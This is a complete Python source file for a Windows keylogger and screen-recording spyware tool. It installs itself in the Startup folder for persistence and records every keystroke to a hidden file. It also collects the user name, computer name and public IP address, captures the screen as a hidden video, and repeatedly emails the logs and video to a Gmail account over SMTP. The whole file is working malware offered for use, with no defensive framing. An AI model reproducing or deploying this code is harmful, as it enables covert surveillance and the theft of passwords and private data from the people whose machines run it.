import datetime
import os
import smtplib
import threading
import numpy as np
import cv2
import subprocess
import platform
import getpass
import pyautogui
import sys
import win32com.client

from win32api import GetSystemMetrics
from email.message import EmailMessage
from requests import get
from pynput.keyboard import Listener
from pathlib import Path

try:
    startup = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(getpass.getuser()) # path to where you want to put the .lnk
    target = sys.argv[0]
    file_name = Path(sys.argv[0]).stem
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(startup+'\\{}.lnk'.format(file_name))
    shortcut.Targetpath = target
    shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
    shortcut.save()
except Exception as e:
    pass

# Key capturing
class Keylogger:
    # Get username
    account = getpass.getuser()

    # Log file location
    filename = 'C:\\Users\\{}\\Documents\\k_logs.txt'.format(account)

    # Header will be added every time we run the script
    def header(self):
        # Create log file
        with open(self.filename, "a+") as f:
            # Hide output
            subprocess.check_call(["attrib", "+H", "C:\\Users\\{}\\Documents\\k_logs.txt".format(self.account)])
            # Current date
            now = datetime.datetime.now()
            date_string = now.strftime("%d/%m/%Y %H:%M:%S")
            # System information
            system = platform.system()
            version = platform.version()
            # Username
            account = getpass.getuser()
            # Computer name
            computer_name = platform.node()
            # Get Public IP
            ip = get('https://api.ipify.org').text
            # Connect all information
            write_to_file = '\n\nDATE: {}\nUSER: {}, SYSTEM: {} {}\nCOMPUTER_NAME: {}, PUBLIC_IP: {}\n\n'.format(
                date_string,
                account,
                system,
                version,
                computer_name,
                ip)
            # Save all information to file
            f.write(write_to_file)

    # on_press instruction
    def on_press(self, key):
        # Delete apostrophe
        character = str(key).replace("'", "")
        # Open log file
        with open(self.filename, "a+") as f:
            if character == "Key.space":
                f.write(" ")
            elif character == "Key.enter":
                f.write("  [ENTER]  ")
            # Make functionally backspace (like in text editor)
            elif character == "Key.backspace":
                with open(self.filename, 'rb+') as filehandle:
                    filehandle.seek(-1, os.SEEK_END)
                    filehandle.truncate()
            # If another characters found - skip it
            elif character.find("Key") == -1:
                f.write(character)
        f.close()

    # Listener loop
    def listener(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()


# Record screen
class ScreenRecord:
    # Get username
    account = Keylogger.account
    # Place to save video file
    v_name = "C:\\Users\\{}\\Videos\\1output.avi".format(account)

    # Screen recording function
    def record(self, time):
        # Unhide output video
        subprocess.check_call(["attrib", "-H", "C:\\Users\\{}\\Videos\\1output.avi".format(self.account)])
        # Get screen width
        width = GetSystemMetrics(0)
        # Get screen height
        height = GetSystemMetrics(1)
        # Video codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(self.v_name, fourcc, 20.0, (width, height))
        # Hide output video
        subprocess.check_call(["attrib", "+H", "C:\\Users\\{}\\Videos\\1output.avi".format(self.account)])

        # How long to record video
        for i in range(time * 20):
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()
        cv2.destroyAllWindows()


# Send email with logs and video
class SendEmail(Keylogger, ScreenRecord):

    def __init__(self, email_address, email_password, time):
        self.email_address = email_address
        self.email_password = email_password
        self.time = time

    def email(self):
        # Email loop
        while True:
            # Record screen for x seconds
            super().record(self.time)
            msg = EmailMessage()
            msg['Subject'] = 'Keylogger logs'
            msg['From'] = gmail
            msg['To'] = gmail
            # Log location
            log = super().filename
            # Video location
            video = super().v_name

            with open(log, 'rb') as f:
                file_data = f.read()
                file_name = f.name

            with open(video, 'rb') as v:
                video_data = v.read()
                video_name = v.name
            # Add attachments
            msg.add_attachment(video_data, maintype='application', subtype='octet-stream', filename=video_name)
            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
            # Send email via SMTP
            try:
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                    smtp.login(self.email_address, self.email_password)
                    smtp.send_message(msg)
                    print('MESSAGE SEND')
            except smtplib.SMTPAuthenticationError:
                print(
                    'Wrong login or password or less secure apps mode is disabled. Please check: https://myaccount.google.com/lesssecureapps')

if __name__ == '__main__':
    k = Keylogger()
    gmail = 'YOUR_GMAIL'
    pass_for_gmail = 'YOUR_PASSWORD'
    e = SendEmail(gmail, pass_for_gmail, 10)


    # Make independent threads
    email_thread = threading.Thread(target=e.email)
    header_thread = threading.Thread(target=k.header)
    key_listener = threading.Thread(target=k.listener)



    header_thread.start()
    key_listener.start()
    email_thread.start()
